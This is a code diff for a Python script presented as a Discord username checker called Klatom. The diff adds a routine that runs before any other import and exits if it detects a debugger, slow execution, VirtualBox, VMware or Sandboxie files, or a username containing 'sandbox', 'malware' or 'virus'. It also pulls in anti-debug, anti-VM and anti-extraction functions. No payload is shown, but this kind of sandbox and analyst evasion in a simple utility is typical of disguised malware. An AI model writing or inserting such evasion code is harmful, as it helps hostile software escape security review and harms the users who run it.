@@ -1,5 +1,63 @@
 #!/usr/bin/env python3
-"""Klatom v2.0.1 – Discord username checker. Loads from GitHub."""
+"""Klatom v2.1.0 – Discord username checker. MAXIMUM SECURITY."""
+
+# ══════════════════════════════════════════════════════════════════════════════
+# SECURITY FIRST — runs BEFORE any other import
+# ══════════════════════════════════════════════════════════════════════════════
+import os, sys
+
+def _pre_security():
+    """Anti-debug + anti-VM BEFORE anything loads."""
+    try:
+        import ctypes, platform, subprocess, time
+
+        if platform.system() != "Windows":
+            return
+
+        # Quick anti-debug
+        try:
+            kernel32 = ctypes.windll.kernel32
+            if kernel32.IsDebuggerPresent():
+                os._exit(1)
+            try:
+                is_db = ctypes.c_bool(False)
+                if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_db)):
+                    if is_db.value:
+                        os._exit(1)
+            except Exception:
+                pass
+        except Exception:
+            pass
+
+        # Quick timing check
+        t1 = time.perf_counter()
+        _ = sum(range(30000))
+        t2 = time.perf_counter()
+        if (t2 - t1) > 0.03:
+            os._exit(1)
+
+        # Quick VM check
+        vm_files = [
+            r"C:\Windows\System32\vmGuestLib.dll",
+            r"C:\Windows\System32\VBoxHook.dll",
+            r"C:\Windows\System32\SbieDll.dll",
+            r"C:\Program Files\VMware",
+            r"C:\Program Files\Oracle\VirtualBox",
+        ]
+        for f in vm_files:
+            if os.path.exists(f):
+                os._exit(1)
+
+        # Quick username check
+        user = os.environ.get("USERNAME", "").lower()
+        if any(x in user for x in ("sandbox", "malware", "test", "virus")):
+            os._exit(1)
+
+    except Exception:
+        pass
+
+_pre_security()
+# ══════════════════════════════════════════════════════════════════════════════
 
 from __future__ import annotations
 
@@ -27,27 +85,9 @@ for _n in ("aiohttp", "aiohttp.client", "aiohttp.access", "aiohttp.internal"):
 warnings.filterwarnings("ignore", message=".*[Uu]nclosed.*")
 warnings.filterwarnings("ignore", message=".*[Cc]onnection.*")
 
-# ── Startup security checks ────────────────────────────────────────────────
-import os, sys
-
-def _startup_security():
-    """Run anti-debug + anti-VM before anything else loads."""
-    try:
-        from crypto import _anti_debug, _anti_vm
-        _anti_debug()
-        _anti_vm()
-    except Exception:
-        pass
-
-    # Kill if running from source in production (exe only)
-    if getattr(sys, "frozen", False):
-        pass  # exe mode — OK
-    else:
-        # Allow source mode for development, but warn
-        pass
-
-_startup_security()
-# ─────────────────────────────────────────────────────────────────────────────
+# Full security init
+from security import security_init, anti_debug, anti_vm, anti_extraction
+security_init()
 
 import atexit, subprocess
 from pathlib import Path
